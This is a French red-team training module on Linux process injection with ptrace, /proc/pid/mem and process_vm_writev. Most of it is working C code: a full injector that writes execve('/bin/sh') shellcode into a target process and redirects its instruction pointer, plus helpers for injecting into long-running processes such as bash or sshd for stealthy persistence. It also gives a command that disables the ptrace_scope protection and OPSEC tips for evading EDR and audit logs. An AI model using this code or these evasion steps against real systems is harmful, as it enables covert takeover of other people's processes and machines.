# Module L09 : Injection de Processus Linux - ptrace, /proc/mem, process_vm_writev

## 🎯 Ce que tu vas apprendre

Dans ce module, tu vas maîtriser l'injection de code dans des processus Linux :
- Utiliser ptrace() pour attacher et contrôler un processus
- Lire/écrire la mémoire avec PTRACE_PEEKDATA/PTRACE_POKEDATA
- Injecter du shellcode dans un processus en cours
- Utiliser process_vm_writev() pour l'écriture mémoire rapide
- Forcer l'exécution de code dans un processus cible

## 📚 Théorie

### C'est quoi l'injection de processus ?

L'**injection de processus** consiste à insérer du code (shellcode) dans la mémoire d'un processus en cours d'exécution, puis à forcer son exécution.

**Cas d'usage Red Team** :
```ascii
Situation initiale :
┌──────────────────┐
│ Processus cible  │  (ex: /bin/bash, serveur web)
│   PID: 1234      │
│   Mémoire:       │
│   [ code ]       │
│   [ data ]       │
│   [ heap ]       │
│   [ stack ]      │
└──────────────────┘

Après injection :
┌──────────────────┐
│ Processus cible  │
│   PID: 1234      │  ← TOUJOURS le même processus!
│   Mémoire:       │
│   [ code ]       │
│   [ data ]       │
│   [ heap ]       │
│   [SHELLCODE]    │  ← Code injecté
│   [ stack ]      │
└──────────────────┘
      │
      └─→ Exécution forcée du shellcode
          (reverse shell, keylogger, etc.)
```

**Avantages** :
1. **Furtivité** : Pas de nouveau processus créé (pas visible dans ps)
2. **Persistence** : Code exécuté dans contexte d'un processus légitime
3. **Bypass** : Contourne certaines détections basées sur exécution de fichiers
4. **Privilèges** : Hérite des permissions du processus cible

### ptrace() - Le débogueur système

**Signature** :
```c
long ptrace(enum __ptrace_request request,
            pid_t pid,
            void *addr,
            void *data);
```

**Commandes principales** :
```c
PTRACE_ATTACH      // Attacher au processus (devient parent)
PTRACE_DETACH      // Détacher
PTRACE_PEEKTEXT    // Lire mot (code)
PTRACE_PEEKDATA    // Lire mot (data)
PTRACE_POKETEXT    // Écrire mot (code)
PTRACE_POKEDATA    // Écrire mot (data)
PTRACE_GETREGS     // Lire registres CPU
PTRACE_SETREGS     // Écrire registres CPU
PTRACE_CONT        // Continuer exécution
PTRACE_SINGLESTEP  // Exécuter 1 instruction
```

**Flux d'injection via ptrace** :
```ascii
1. PTRACE_ATTACH
   ┌──────────────┐      ptrace(ATTACH, pid)     ┌────────────┐
   │   Injecteur  │ ────────────────────────────→ │   Cible    │
   │   (ton code) │                               │  (paused)  │
   └──────────────┘                               └────────────┘
                                                   État: STOPPED

2. PTRACE_GETREGS
   ┌──────────────┐      Lire RIP, RSP, etc.     ┌────────────┐
   │   Injecteur  │ ←──────────────────────────── │   Cible    │
   │              │   regs.rip = 0x7f12340       │            │
   └──────────────┘                               └────────────┘

3. PTRACE_POKEDATA (écrire shellcode)
   ┌──────────────┐    Écrire 8 bytes par 8      ┌────────────┐
   │   Injecteur  │ ────────────────────────────→ │   Cible    │
   │              │   à l'adresse cible           │ [shellcode]│
   └──────────────┘                               └────────────┘

4. PTRACE_SETREGS (changer RIP)
   ┌──────────────┐    regs.rip = addr_shellcode ┌────────────┐
   │   Injecteur  │ ────────────────────────────→ │   Cible    │
   │              │                               │ RIP modifié│
   └──────────────┘                               └────────────┘

5. PTRACE_DETACH
   ┌──────────────┐      Détacher                ┌────────────┐
   │   Injecteur  │ ────────────────────────────→ │   Cible    │
   │              │                               │ (exécute!) │
   └──────────────┘                               └────────────┘
                                                   Shellcode run!
```

### Limitations de ptrace()

**Restrictions de sécurité** :
```ascii
/proc/sys/kernel/yama/ptrace_scope
┌────────┬─────────────────────────────────────┐
│ Valeur │ Signification                       │
├────────┼─────────────────────────────────────┤
│   0    │ Pas de restriction (mode classique) │
│   1    │ Seulement processus enfants         │  ← Défaut Ubuntu
│   2    │ Seulement root (CAP_SYS_PTRACE)     │
│   3    │ Complètement désactivé              │
└────────┴─────────────────────────────────────┘
```

**Bypass (si root)** :
```bash
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
```

**Alternative : /proc/pid/mem**
- Pas bloqué par ptrace_scope
- Mais nécessite quand même ptrace_attach pour débloquer l'accès

### process_vm_writev() - Alternative moderne

**Signature** :
```c
ssize_t process_vm_writev(pid_t pid,
                          const struct iovec *local_iov,
                          unsigned long liovcnt,
                          const struct iovec *remote_iov,
                          unsigned long riovcnt,
                          unsigned long flags);
```

**Avantages** :
- Plus rapide que PTRACE_POKEDATA (une seule syscall)
- Peut écrire de gros blocs d'un coup
- Moins de context switches

**Inconvénient** :
- Nécessite toujours des permissions (CAP_SYS_PTRACE ou même UID)

## 🔍 Visualisation

### Comparaison des méthodes

```ascii
┌─────────────────────────────────────────────────────────────┐
│              MÉTHODES D'INJECTION MÉMOIRE                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. ptrace(PTRACE_POKEDATA)                                │
│     ┌───────────┐                                          │
│     │  8 bytes  │  ← Écriture mot par mot                  │
│     └───────────┘     (lent pour gros shellcode)           │
│     Syscall par mot                                         │
│                                                             │
│  2. /proc/pid/mem + write()                                │
│     ┌─────────────────────────────┐                        │
│     │  Bloc complet               │  ← Une seule opération │
│     └─────────────────────────────┘                        │
│     Nécessite lseek() + write()                            │
│                                                             │
│  3. process_vm_writev()                                    │
│     ┌─────────────────────────────┐                        │
│     │  Bloc complet               │  ← Le plus rapide      │
│     └─────────────────────────────┘                        │
│     Une seule syscall, pas de lseek                        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Détail PTRACE_POKEDATA

```ascii
Sur x86-64, on écrit 8 bytes à la fois :

Shellcode à injecter (20 bytes) :
┌──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┐
│48│31│c0│48│31│ff│48│31│f6│48│31│d2│b0│3b│0f│05│c3│00│00│00│
└──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┘
 └────────┬────────┘ └────────┬────────┘ └────────┬────────┘
          │                   │                   │
      Mot 1               Mot 2               Mot 3 (padded)

ptrace(POKEDATA, pid, addr+0, mot1);   // Écrit bytes 0-7
ptrace(POKEDATA, pid, addr+8, mot2);   // Écrit bytes 8-15
ptrace(POKEDATA, pid, addr+16, mot3);  // Écrit bytes 16-23
```

## 💻 Exemples pratiques

### Exemple 1 : Attacher avec ptrace()

```c
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    pid_t target_pid = atoi(argv[1]);

    printf("[+] Attaching to PID %d...\n", target_pid);

    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
        perror("ptrace ATTACH");
        return 1;
    }

    // Attendre que le processus soit stoppé
    waitpid(target_pid, NULL, 0);
    printf("[+] Process attached and stopped\n");

    // Détacher
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    printf("[+] Detached\n");

    return 0;
}
```

### Exemple 2 : Lire registres CPU

```c
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    pid_t pid = atoi(argv[1]);
    struct user_regs_struct regs;

    // Attacher
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace ATTACH");
        return 1;
    }

    waitpid(pid, NULL, 0);

    // Lire les registres
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
        perror("ptrace GETREGS");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return 1;
    }

    printf("[+] Registres du processus %d :\n", pid);
    printf("    RIP: 0x%llx\n", regs.rip);
    printf("    RSP: 0x%llx\n", regs.rsp);
    printf("    RBP: 0x%llx\n", regs.rbp);
    printf("    RAX: 0x%llx\n", regs.rax);

    // Détacher
    ptrace(PTRACE_DETACH, pid, NULL, NULL);

    return 0;
}
```

### Exemple 3 : Écrire en mémoire (PTRACE_POKEDATA)

```c
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Écrire un buffer dans la mémoire du processus cible
int write_memory(pid_t pid, unsigned long addr, void *data, size_t len) {
    // ptrace écrit par mots de 8 bytes (sur x86-64)
    long *words = (long *)data;
    size_t num_words = (len + sizeof(long) - 1) / sizeof(long);

    for (size_t i = 0; i < num_words; i++) {
        long word;

        // Lire d'abord si on est à la fin (padding)
        if (i == num_words - 1 && len % sizeof(long) != 0) {
            word = ptrace(PTRACE_PEEKDATA, pid, addr + i * sizeof(long), NULL);
            memcpy(&word, (char*)data + i * sizeof(long), len % sizeof(long));
        } else {
            word = words[i];
        }

        if (ptrace(PTRACE_POKEDATA, pid, addr + i * sizeof(long), word) == -1) {
            perror("ptrace POKEDATA");
            return -1;
        }
    }

    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <pid> <address_hex>\n", argv[0]);
        return 1;
    }

    pid_t pid = atoi(argv[1]);
    unsigned long addr = strtoul(argv[2], NULL, 16);

    // Data à écrire
    char data[] = "HACKED!";

    // Attacher
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace ATTACH");
        return 1;
    }

    waitpid(pid, NULL, 0);
    printf("[+] Attached to PID %d\n", pid);

    // Écrire
    printf("[+] Writing '%s' at 0x%lx...\n", data, addr);
    if (write_memory(pid, addr, data, sizeof(data)) == 0) {
        printf("[+] Memory written successfully\n");
    }

    // Détacher
    ptrace(PTRACE_DETACH, pid, NULL, NULL);

    return 0;
}
```

### Exemple 4 : Injection complète avec exécution

```c
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Shellcode : execve("/bin/sh", NULL, NULL)
unsigned char shellcode[] = {
    0x48, 0x31, 0xd2,                               // xor rdx, rdx
    0x48, 0x31, 0xf6,                               // xor rsi, rsi
    0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,  // mov rdi, "/bin/sh"
    0x57,                                           // push rdi
    0x48, 0x89, 0xe7,                               // mov rdi, rsp
    0xb8, 0x3b, 0x00, 0x00, 0x00,                  // mov eax, 59
    0x0f, 0x05                                      // syscall
};

int inject_and_execute(pid_t pid) {
    struct user_regs_struct oldregs, newregs;

    // 1. Attacher
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ATTACH");
        return -1;
    }
    waitpid(pid, NULL, 0);
    printf("[+] Attached to PID %d\n", pid);

    // 2. Sauvegarder registres
    ptrace(PTRACE_GETREGS, pid, NULL, &oldregs);
    printf("[+] Saved registers (RIP: 0x%llx)\n", oldregs.rip);

    // 3. Écrire shellcode à l'adresse RIP actuelle
    unsigned long inject_addr = oldregs.rip;
    printf("[+] Injecting shellcode at 0x%llx\n", inject_addr);

    for (size_t i = 0; i < sizeof(shellcode); i += sizeof(long)) {
        long word = 0;
        memcpy(&word, shellcode + i,
               (i + sizeof(long) <= sizeof(shellcode)) ? sizeof(long) : sizeof(shellcode) - i);

        ptrace(PTRACE_POKEDATA, pid, inject_addr + i, word);
    }

    // 4. Modifier RIP pour pointer vers le shellcode (déjà à la bonne adresse)
    newregs = oldregs;
    newregs.rip = inject_addr;
    ptrace(PTRACE_SETREGS, pid, NULL, &newregs);
    printf("[+] RIP set to shellcode address\n");

    // 5. Détacher (le shellcode s'exécute)
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    printf("[+] Detached - shellcode executing!\n");

    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    pid_t pid = atoi(argv[1]);
    inject_and_execute(pid);

    return 0;
}
```

### Exemple 5 : process_vm_writev()

```c
#include <sys/uio.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int inject_with_writev(pid_t pid, unsigned long addr, void *data, size_t len) {
    struct iovec local[1];
    struct iovec remote[1];

    // Local buffer (notre shellcode)
    local[0].iov_base = data;
    local[0].iov_len = len;

    // Remote address (dans le processus cible)
    remote[0].iov_base = (void *)addr;
    remote[0].iov_len = len;

    // Écrire
    ssize_t nwritten = process_vm_writev(pid, local, 1, remote, 1, 0);

    if (nwritten == -1) {
        perror("process_vm_writev");
        return -1;
    }

    printf("[+] Wrote %zd bytes to 0x%lx in PID %d\n", nwritten, addr, pid);
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <pid> <address_hex>\n", argv[0]);
        return 1;
    }

    pid_t pid = atoi(argv[1]);
    unsigned long addr = strtoul(argv[2], NULL, 16);

    char shellcode[] = "\x90\x90\x90\xc3";  // NOPs + RET

    inject_with_writev(pid, addr, shellcode, sizeof(shellcode));

    return 0;
}
```

## 🎯 Application Red Team

### 1. Injection dans processus long-running

```c
// Trouver un processus cible légitime (ex: bash, sshd)
// Injecter reverse shell
// Maintenir persistence sans créer nouveau processus

pid_t find_process_by_name(const char *name) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "pgrep %s", name);

    FILE *fp = popen(cmd, "r");
    if (!fp) return -1;

    pid_t pid;
    if (fscanf(fp, "%d", &pid) == 1) {
        pclose(fp);
        return pid;
    }

    pclose(fp);
    return -1;
}

// Usage
pid_t bash_pid = find_process_by_name("bash");
if (bash_pid > 0) {
    inject_and_execute(bash_pid);
}
```

### 2. Sauvegarder et restaurer le code original

```c
// Technique non-destructive : sauvegarder puis restaurer
void* backup_code(pid_t pid, unsigned long addr, size_t len) {
    void *backup = malloc(len);

    for (size_t i = 0; i < len; i += sizeof(long)) {
        long word = ptrace(PTRACE_PEEKDATA, pid, addr + i, NULL);
        memcpy((char*)backup + i, &word, sizeof(long));
    }

    return backup;
}

void restore_code(pid_t pid, unsigned long addr, void *backup, size_t len) {
    for (size_t i = 0; i < len; i += sizeof(long)) {
        long word;
        memcpy(&word, (char*)backup + i, sizeof(long));
        ptrace(PTRACE_POKEDATA, pid, addr + i, word);
    }
}
```

### 3. Injection via /proc/pid/mem (alternative)

```c
#include <fcntl.h>

int inject_via_proc_mem(pid_t pid, unsigned long addr, void *data, size_t len) {
    char mem_path[64];
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);

    // Nécessite ptrace attach d'abord pour débloquer l'accès
    ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    waitpid(pid, NULL, 0);

    int fd = open(mem_path, O_RDWR);
    if (fd == -1) {
        perror("open /proc/pid/mem");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    lseek(fd, addr, SEEK_SET);
    ssize_t written = write(fd, data, len);

    close(fd);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);

    return written == len ? 0 : -1;
}
```

## 📝 Points clés

### À retenir absolument

1. **ptrace() = débogueur système**
   - Permet d'attacher, lire/écrire mémoire, contrôler exécution
   - Bloqué par /proc/sys/kernel/yama/ptrace_scope
   - Nécessite permissions (même UID ou root)

2. **Flux d'injection**
   - ATTACH → GETREGS → POKEDATA (shellcode) → SETREGS (RIP) → DETACH

3. **Méthodes d'écriture**
   - ptrace POKEDATA : 8 bytes par syscall (lent)
   - /proc/pid/mem : write() bloc complet (rapide)
   - process_vm_writev() : une syscall (le plus rapide)

4. **Considérations**
   - Sauvegarder registres/code original
   - Shellcode position-independent (PIC)
   - Gérer alignement mémoire (8 bytes)

### Commandes utiles

```bash
# Voir ptrace_scope
cat /proc/sys/kernel/yama/ptrace_scope

# Désactiver (root requis)
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope

# Lister processus
ps aux
pgrep <name>

# Voir mappings mémoire cible
cat /proc/<PID>/maps

# Debugger avec gdb (utilise ptrace)
gdb -p <PID>
```

### Considérations OPSEC

1. **Détection**
   - ptrace() loggé dans audit logs
   - EDR détecte PTRACE_ATTACH sur processus critiques
   - Comportement anormal du processus cible

2. **Furtivité**
   - Viser processus non-critiques
   - Shellcode minimal et rapide
   - Restaurer état original si possible

3. **Alternatives**
   - LD_PRELOAD pour hooking (moins invasif)
   - Kernel module (LKM) pour hooking syscall table
   - eBPF pour monitoring sans ptrace

## 📚 Ressources complémentaires

- [ptrace(2) man page](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [process_vm_writev(2) man page](https://man7.org/linux/man-pages/man2/process_vm_writev.2.html)
- [Playing with ptrace](https://www.linuxjournal.com/article/6100)
- [Linux Process Injection](https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html)

---

**Navigation**
- [Module précédent : L08 Memory Linux](../../PHASE_L01_LINUX_BASICS/L08_memory_linux/)
- [Module suivant : L10 Syscall Hooking User](../L10_syscall_hooking_user/)
